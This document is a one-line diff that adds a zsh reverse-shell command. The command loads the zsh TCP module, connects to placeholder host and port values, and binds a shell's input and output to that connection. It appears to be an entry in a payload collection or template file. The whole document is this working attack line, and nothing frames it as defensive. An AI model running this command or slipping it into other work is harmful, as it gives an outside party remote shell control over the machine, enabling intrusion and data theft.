@@ -1,0 +1,1 @@
+zsh -c 'zmodload zsh/net/tcp && ztcp TEMPHOST TEMPPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
